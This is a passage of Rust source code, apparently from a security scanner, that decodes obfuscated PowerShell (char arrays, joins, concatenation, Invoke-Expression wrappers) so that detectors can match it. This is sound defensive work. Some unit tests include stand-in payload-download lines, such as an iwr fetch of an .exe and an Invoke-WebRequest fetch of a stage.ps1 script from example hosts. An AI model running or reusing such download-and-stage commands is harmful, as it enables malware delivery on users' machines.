            if parts.is_empty() || parts.len() > 128 {
                return None;
            }
            let joined = parts.join("");
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod ps_join_prefilter_tests {
    use super::expand_ps_join;

    #[test]
    fn ignores_text_without_join_operator() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_ps_join(text), text);
    }
}

#[allow(clippy::expect_used)]
static PS_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    // $name = 'literal', $name = "literal", or the common no-op subexpression
    // wrapper $name = $('literal'). Double-quoted values with interpolation or
    // metacharacters are intentionally skipped.
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\$\(\s*)?(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")(?:\s*\))?"#,
    )
    .expect("ps var assign")
});

#[allow(clippy::expect_used)]
static PS_INT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,6})(?:\s*(?:;|\r?\n|$))"#)
        .expect("ps int assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_APPEND_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\+=\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("ps var append")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?"#)
        .expect("ps array assign")
});

#[allow(clippy::expect_used)]
static PS_ARGUMENT_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"|\$[A-Za-z_][A-Za-z0-9_]*)\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"|\$[A-Za-z_][A-Za-z0-9_]*))\s*\)?"#)
        .expect("ps argument array assign")
});

#[allow(clippy::expect_used)]
static PS_JOIN_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\)?"#)
        .expect("ps join assign")
});

#[allow(clippy::expect_used)]
static PS_BRACED_DOUBLE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"([^"\r\n;=]*\$\{[A-Za-z_][A-Za-z0-9_]*\}[^"\r\n;=]*)""#,
    )
    .expect("ps braced double assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_REF_RE: Lazy<Regex> = Lazy::new(|| {
    // $name reference
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps var ref")
});

#[allow(clippy::expect_used)]
static PS_INTERPOLATED_VAR_REF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)"#)
        .expect("ps interpolated var ref")
});

#[allow(clippy::expect_used)]
static PS_SIMPLE_DOUBLE_QUOTED_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#""([^"\r\n;=]*\$[A-Za-z_{][^"\r\n;=]*)""#).expect("ps simple double quoted var")
});

#[allow(clippy::expect_used)]
static PS_INDEX_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\]\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\])"#,
    )
    .expect("ps index concat assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("ps var concat assign")
});

#[allow(clippy::expect_used)]
static PS_MIXED_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:(?:\$[A-Za-z_][A-Za-z0-9_]*|'(?:''|[^'])*'|"[^"`$\\]*(?:\\.[^"`$\\]*)*")\s*\+\s*)+(?:\$[A-Za-z_][A-Za-z0-9_]*|'(?:''|[^'])*'|"[^"`$\\]*(?:\\.[^"`$\\]*)*"))"#,
    )
    .expect("ps mixed concat assign")
});

#[allow(clippy::expect_used)]
static PS_MIXED_CONCAT_PART_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)|'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)""#)
        .expect("ps mixed concat part")
});

#[allow(clippy::expect_used)]
static PS_INDEX_REF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]"#).expect("ps index ref")
});

fn ps_literal_assignment_value(caps: &regex::Captures<'_>) -> Option<String> {
    caps.get(2)
        .map(|m| m.as_str().replace("''", "'"))
        .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))
}

fn ps_integer_bindings(text: &str) -> std::collections::HashMap<String, usize> {
    PS_INT_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str().to_ascii_lowercase();
            let value = caps.get(2)?.as_str().parse().ok()?;
            Some((name, value))
        })
        .collect()
}

fn resolve_ps_usize_expr(
    expr: &str,
    bindings: &std::collections::HashMap<String, usize>,
) -> Option<usize> {
    let mut total = 0usize;
    let mut saw_part = false;
    for raw in expr.split('+') {
        let part = raw.trim();
        if part.is_empty() {
            return None;
        }
        let value = if let Some(name) = part.strip_prefix('$') {
            if !name
                .chars()
                .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
            {
                return None;
            }
            *bindings.get(&name.to_ascii_lowercase())?
        } else {
            part.parse().ok()?
        };
        total = total.checked_add(value)?;
        saw_part = true;
    }
    saw_part.then_some(total)
}

fn expand_ps_index_concat_assignments(text: &str) -> String {
    if !text.contains('[') || !text.contains('+') {
        return text.to_string();
    }
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_INDEX_CONCAT_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let dst = caps.get(1)?.as_str();
            let rhs = caps.get(2)?.as_str();
            let mut decoded = String::new();
            for ref_caps in PS_INDEX_REF_RE.captures_iter(rhs) {
                let var = ref_caps.get(1)?.as_str();
                let idx: usize = ref_caps.get(2)?.as_str().parse().ok()?;
                let value = bindings.get(&var.to_ascii_lowercase())?;
                decoded.push(value.chars().nth(idx)?);
            }
            if decoded.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("${dst}='{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod ps_index_concat_prefilter_tests {
    use super::expand_ps_index_concat_assignments;

    #[test]
    fn ignores_text_without_index_concat_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_ps_index_concat_assignments(text), text);
    }
}

fn expand_ps_variables(text: &str) -> String {
    if !text.contains('$') || !text.contains('=') {
        return text.to_string();
    }
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let after = text[caps.get(0).map_or(0, |m| m.end())..].trim_start();
            if after.starts_with('+') {
                continue;
            }
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    for caps in PS_ARRAY_ASSIGN_RE.captures_iter(text) {
        let (Some(n), Some(parts_text)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let parts: Vec<String> = JOIN_PART_RE
            .captures_iter(parts_text.as_str())
            .filter_map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .collect();
        if !parts.is_empty() {
            bindings.insert(n.as_str().to_ascii_lowercase(), parts.join(""));
        }
    }
    for caps in PS_JOIN_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(src), Some(sep)) = (
            caps.get(1),
            caps.get(2),
            caps.get(3).or_else(|| caps.get(4)),
        ) else {
            continue;
        };
        if let Some(value) = bindings.get(&src.as_str().to_ascii_lowercase()).cloned() {
            let joined = if sep.as_str().is_empty() {
                value
            } else {
                value
                    .chars()
                    .map(|c| c.to_string())
                    .collect::<Vec<_>>()
                    .join(sep.as_str())
            };
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    for caps in PS_BRACED_DOUBLE_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(value)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        if let Some(resolved) = resolve_ps_interpolated_string(value.as_str(), &bindings) {
            bindings.insert(dst.as_str().to_ascii_lowercase(), resolved);
        }
    }
    for caps in PS_VAR_CONCAT_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(rhs)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let mut joined = String::new();
        let mut ok = false;
        for part in PS_VAR_REF_RE.captures_iter(rhs.as_str()) {
            let Some(name) = part.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(value) = bindings.get(&name.to_ascii_lowercase()) else {
                ok = false;
                break;
            };
            joined.push_str(value);
            ok = true;
        }
        if ok && !joined.is_empty() {
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    let expanded_text = expand_simple_double_quoted_var_literals(text, &bindings);

    // Replace $name references with 'value' (quoted, so URL regexes still match).
    // Collect all replacements from original text, then apply in reverse order.
    let matches: Vec<(usize, usize, String)> = PS_VAR_REF_RE
        .captures_iter(&expanded_text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let name = caps.get(1)?.as_str();
            // Don't replace inside assignment LHS — heuristic: skip refs
            // immediately followed by an assignment operator, but not equality.
            let after = &expanded_text[full.end()..];
            let after_trim = after.trim_start();
            if is_ps_assignment_operator(after_trim) {
                return None;
            }
            bindings.get(&name.to_ascii_lowercase()).and_then(|v| {
                if is_large_literal_carrier(v) {
                    return None;
                }
                Some((full.start(), full.end(), format!("'{}'", v)))
            })
        })
        .collect();

    let mut out = expanded_text;
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn resolve_ps_interpolated_string(
    value: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let mut out = String::new();
    let mut cursor = 0;
    for caps in PS_INTERPOLATED_VAR_REF_RE.captures_iter(value) {
        let full = caps.get(0)?;
        out.push_str(&value[cursor..full.start()]);
        let name = caps.get(1).or_else(|| caps.get(2))?.as_str();
        let replacement = bindings.get(&name.to_ascii_lowercase())?;
        out.push_str(replacement);
        cursor = full.end();
    }
    if cursor == 0 {
        return None;
    }
    out.push_str(&value[cursor..]);
    Some(out)
}

fn expand_simple_double_quoted_var_literals(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> String {
    let matches: Vec<(usize, usize, String)> = PS_SIMPLE_DOUBLE_QUOTED_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let value = caps.get(1)?.as_str();
            let resolved = resolve_ps_interpolated_string(value, bindings)?;
            Some((
                full.start(),
                full.end(),
                format!("\"{}\"", resolved.replace('"', "`\"")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_path_combine_assignments(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "path]::combine") {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_PATH_COMBINE_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let name = caps.get(1)?.as_str();
            let base = clean_ps_path_combine_part(caps.get(2)?.as_str())?;
            let leaf = clean_ps_path_combine_part(
                caps.get(3)
                    .or_else(|| caps.get(4))
                    .map(|m| m.as_str())
                    .unwrap_or_default(),
            )?;
            let joined = join_windows_path(&base, &leaf)?;
            Some((full.start(), full.end(), format!("${name}='{}'", joined)))
        })
        .collect();
    if matches.is_empty() {
        return text.to_string();
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn clean_ps_path_combine_part(part: &str) -> Option<String> {
    let trimmed = part
        .trim()
        .trim_matches(['"', '\''])
        .trim_end_matches([')', ' ']);
    if trimmed.is_empty()
        || trimmed.contains('$')
        || trimmed.contains('`')
        || trimmed.contains('\r')
        || trimmed.contains('\n')
        || trimmed.contains(';')
    {
        return None;
    }
    Some(trimmed.to_string())
}

fn join_windows_path(base: &str, leaf: &str) -> Option<String> {
    if base.is_empty() || leaf.is_empty() {
        return None;
    }
    if leaf.contains(':') || leaf.starts_with(['\\', '/']) {
        return Some(leaf.replace('/', "\\"));
    }
    let mut joined = base.trim_end_matches(['\\', '/']).replace('/', "\\");
    joined.push('\\');
    joined.push_str(&leaf.replace('/', "\\"));
    Some(joined)
}

#[cfg(test)]
mod ps_variables_prefilter_tests {
    use super::{expand_ps_path_combine_assignments, expand_ps_variables};

    #[test]
    fn ignores_text_without_assignment_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_ps_variables(text), text);
    }

    #[test]
    fn expands_path_combine_assignment_with_literal_leaf() {
        let text = r#"$filePath1 = [System.IO.Path]::Combine(C:\Users\puncher, 'qdll.exe'); iwr https://x.example/qz.exe -OutFile $filePath1"#;
        let expanded = expand_ps_path_combine_assignments(text);
        assert!(
            expanded.contains(r#"$filePath1='C:\Users\puncher\qdll.exe'"#),
            "expanded: {expanded}"
        );
    }
}

fn is_large_literal_carrier(value: &str) -> bool {
    value.len() >= 64 * 1024
        || (value.len() >= 8192
            && value
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')))
}

fn is_ps_assignment_operator(text: &str) -> bool {
    if text.starts_with("==") {
        return false;
    }
    text.starts_with('=')
        || text.starts_with("+=")
        || text.starts_with("-=")
        || text.starts_with("*=")
        || text.starts_with("/=")
        || text.starts_with("%=")
}

// ---- Space-concat expander (Pattern C) ----

#[allow(clippy::expect_used)]
static SPACE_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // 'a' 'b' 'c' ...  (2+ adjacent single-quoted strings separated by whitespace ONLY,
    // no + or - operator between them)
    // The separator between strings is pure whitespace (no operator chars).
    Regex::new(r#"'[^']*'(?:\s+'[^']*')+"#).expect("space concat")
});

#[allow(clippy::expect_used)]
static SPACE_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"'([^']*)'").expect("space concat part"));

fn expand_space_concat(text: &str) -> String {
    if !text.contains("' '") && !text.contains("'  '") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if previous_non_whitespace_ascii_byte(text, m.start()) == Some(b'&')
                || follows_quoted_call_operator_command(text, m.start())
            {
                return None;
            }
            let s = m.as_str();
            // Extract all single-quoted parts
            let parts: Vec<String> = SPACE_PART_RE
                .captures_iter(s)
                .filter_map(|c| c.get(1).map(|cap| cap.as_str().to_string()))
                .collect();
            if parts.len() < 2 {
                return None;
            }
            let combined = parts.join("");
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn follows_quoted_call_operator_command(text: &str, pos: usize) -> bool {
    let bytes = text.as_bytes();
    let mut cursor = pos;
    while cursor > 0 && bytes[cursor - 1].is_ascii_whitespace() {
        cursor -= 1;
    }
    if cursor == 0 {
        return false;
    }

    let token_start = if bytes[cursor - 1] == b'\'' {
        let close_quote = cursor - 1;
        let Some(open_quote) = text[..close_quote].rfind('\'') else {
            return false;
        };
        open_quote
    } else {
        let mut start = cursor;
        while start > 0
            && (bytes[start - 1].is_ascii_alphanumeric()
                || matches!(bytes[start - 1], b'_' | b'-' | b':' | b'$'))
        {
            start -= 1;
        }
        if start == cursor {
            return false;
        }
        start
    };

    let mut before_token = token_start;
    while before_token > 0 && bytes[before_token - 1].is_ascii_whitespace() {
        before_token -= 1;
    }
    before_token > 0 && bytes[before_token - 1] == b'&'
}

#[cfg(test)]
mod space_concat_prefilter_tests {
    use super::expand_space_concat;

    #[test]
    fn ignores_text_without_space_concat_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_space_concat(text), text);
    }

    #[test]
    fn does_not_merge_quoted_call_operator_arguments() {
        let text = "& 'Clean' 'payload' '~'";
        assert_eq!(expand_space_concat(text), text);
    }
}

// ---- Char-array chunk expander (Pattern D) ----

#[allow(clippy::expect_used)]
static CHAR_ARRAY_CHUNK_RE: Lazy<Regex> = Lazy::new(|| {
    // ([char[]]@( N1,N2,N3 )-join '')
    Regex::new(r#"\(\[char\[\]\]\s*@\(\s*((?:\d+\s*,\s*)*\d+)\s*\)\s*-join\s*['"][^'"]*['"]\s*\)"#)
        .expect("char arr chunk")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?String\]::Join\s*\(\s*['"]([^'"]*)['"]\s*,\s*\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*\)"#,
    )
    .expect("string join char array")
});

#[allow(clippy::expect_used)]
static UNARY_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)-join\s+\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*"#,
    )
    .expect("unary join char array")
});

fn decode_char_array_nums(nums_str: &str) -> Option<String> {
    if !nums_str.is_ascii() {
        return None;
    }
    let mut out = String::new();
    for part in nums_str.as_bytes().split(|b| *b == b',') {
        let part = std::str::from_utf8(part).ok()?.trim();
        let n: u32 = part.parse().ok()?;
        out.push(char::from_u32(n)?);
    }
    if out.is_empty() {
        None
    } else {
        Some(out)
    }
}

fn decode_ps_char_array_nums(nums_str: &str, separator: &str) -> Option<String> {
    let chars: Vec<String> = nums_str
        .split(',')
        .map(|part| {
            let value = parse_ps_char_codepoint(part.trim())?;
            char::from_u32(value).map(|ch| ch.to_string())
        })
        .collect::<Option<_>>()?;
    if chars.is_empty() || chars.len() > 128 * 1024 {
        return None;
    }
    Some(chars.join(separator))
}

fn expand_string_join_char_arrays(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "string]::join")
        || !contains_ascii_case_insensitive(text, "char[]")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let separator = caps.get(1)?.as_str();
            let decoded = decode_ps_char_array_nums(caps.get(2)?.as_str(), separator)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_unary_join_char_arrays(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join")
        || !contains_ascii_case_insensitive(text, "char[]")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = UNARY_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let decoded = decode_ps_char_array_nums(caps.get(1)?.as_str(), "")?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn contains_char_array_chunk_shape(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "([char[]]@(")
        && contains_ascii_case_insensitive(text, "-join")
}

fn expand_char_array_concat_chunks(text: &str) -> String {
    if !contains_char_array_chunk_shape(text) {
        return text.to_string();
    }
    let mut manual_matches = Vec::new();
    let mut search_from = 0;
    while let Some(start) = find_ascii_case_insensitive_from(text, "([char[]]@(", search_from) {
        let Some((mut end, first)) = parse_char_array_chunk_at(text, start) else {
            search_from = start + 1;
            continue;
        };
        let mut decoded = first;
        let mut count = 1;
        loop {
            let rest = &text[end..];
            let trimmed = rest.trim_start();
            if !trimmed.starts_with('+') {
                break;
            }
            let ws = rest.len() - trimmed.len();
            let after_plus = &trimmed[1..];
            let after_plus_trimmed = after_plus.trim_start();
            let next_start = end + ws + 1 + (after_plus.len() - after_plus_trimmed.len());
            let Some((next_end, next_decoded)) = parse_char_array_chunk_at(text, next_start) else {
                break;
            };
            decoded.push_str(&next_decoded);
            end = next_end;
            count += 1;
        }
        if count > 1 {
            manual_matches.push((start, end, format!("'{}'", decoded)));
            search_from = end;
        } else {
            search_from = start + 1;
        }
    }
    if !manual_matches.is_empty() {
        let mut out = text.to_string();
        for (start, end, replacement) in manual_matches.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
        return out;
    }

    let chunks: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|m| {
            let full = m.get(0)?;
            let decoded = decode_char_array_nums(m.get(1)?.as_str())?;
            Some((full.start(), full.end(), decoded))
        })
        .collect();
    let mut matches = Vec::new();
    let mut i = 0;
    while i < chunks.len() {
        let (start, mut end, first) = chunks[i].clone();
        let mut decoded = first;
        let mut j = i + 1;
        while j < chunks.len() {
            let between = text[end..chunks[j].0].trim();
            if between != "+" {
                break;
            }
            decoded.push_str(&chunks[j].2);
            end = chunks[j].1;
            j += 1;
        }
        if j > i + 1 {
            matches.push((start, end, format!("'{}'", decoded)));
            i = j;
        } else {
            i += 1;
        }
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_char_array_chunk_at(text: &str, start: usize) -> Option<(usize, String)> {
    let prefix = "([char[]]@(";
    if !contains_ascii_case_insensitive(&text[start..], prefix) {
        return None;
    }
    let nums_start = start + prefix.len();
    let nums_end = text[nums_start..].find(')')? + nums_start;
    let decoded = decode_char_array_nums(&text[nums_start..nums_end])?;
    let after_nums = &text[nums_end + 1..];
    let after_trimmed = after_nums.trim_start();
    if !contains_ascii_case_insensitive(after_trimmed, "-join") {
        return None;
    }
    let chunk_end = nums_end + 1 + after_nums.find(')')? + 1;
    Some((chunk_end, decoded))
}

fn expand_char_array_chunks(text: &str) -> String {
    if !contains_char_array_chunk_shape(text) {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let s = decode_char_array_nums(caps.get(1)?.as_str())?;
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    // After each chunk becomes 'x', a chain like 'a' + 'b' + 'c' is now standard PS
    // concatenation — expand_string_concat (already in pipeline) handles that.
    out
}

#[cfg(test)]
mod char_array_chunk_prefilter_tests {
    use super::{expand_char_array_chunks, expand_char_array_concat_chunks};

    #[test]
    fn ignores_text_without_char_array_chunk_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_char_array_concat_chunks(text), text);
        assert_eq!(expand_char_array_chunks(text), text);
    }
}

#[cfg(test)]
mod literal_trim_extractor_tests {
    use super::expand_literal_trim_extractor_calls;

    #[test]
    fn rewrites_quoted_call_operator_trim_extractor_call() {
        let text = r#"function Clean($value,$chars) {
  return $value.Trim($chars)
}
& 'Clean' '~~~Invoke-WebRequest -Uri https://ps-quoted-call-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-quoted-call-extractor.example/stage.ps1'"
            ),
            "quoted call-operator trim extractor call was not rewritten:\n{out}"
        );
    }
}

// ---- Skip-Nth-Char decoder (Invoke-Obfuscation pattern) ----

#[allow(clippy::expect_used)]
static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: function NAME(...){ ... } or New-Item function definitions.
    // Captures: group 1 = fn name from `function NAME`, group 2 = fn name from `-n/-Name NAME`
    // The body must contain a do{...} until loop with $idx += N pattern.
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{([^{}]*?do\s*\{[^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}[^{}]*?until[^{}]*?)\}"#
    ).expect("skip-nth def")
});

#[allow(clippy::expect_used)]
static SKIP_NTH_INIT_RE: Lazy<Regex> = Lazy::new(|| {
    // Extracts: $idx = N (initializer before the loop)
    Regex::new(r#"\$(\w+)\s*=\s*(\d+)"#).expect("skip-nth init")
});

#[allow(clippy::expect_used)]
static INVOKE_EXPRESSION_WRAPPER_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{[^{}]*invoke-expression[^{}]*\}"#,
    )
    .expect("invoke-expression wrapper def")
});

fn expand_invoke_expression_wrappers(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "invoke-expression")
        && !contains_ascii_case_insensitive(text, "iex")
    {
        return text.to_string();
    }
    let names: Vec<String> = INVOKE_EXPRESSION_WRAPPER_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            caps.get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .collect();
    if names.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for name in names {
        out = inline_ps_literal_calls(&out, &name);
    }
    out
}

#[cfg(test)]
mod invoke_expression_wrapper_prefilter_tests {
    use super::expand_invoke_expression_wrappers;

    #[test]
    fn ignores_text_without_invoke_expression_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_invoke_expression_wrappers(text), text);
    }
}

#[allow(clippy::expect_used)]
static PASSTHROUGH_CALL_WRAPPER_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\(\s*\$(\w+)\s*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{.{0,4096}?&\s*\(?\s*'([^']+)'\s*\)?\s*\(\s*\$(\w+)\s*\)"#,
    )
    .expect("passthrough call wrapper def")
});

#[allow(clippy::expect_used)]
static LITERAL_REPLACE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s+-i?replace\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)[^{}]*\}"#,
    )
    .expect("literal replace extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_DOT_REPLACE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
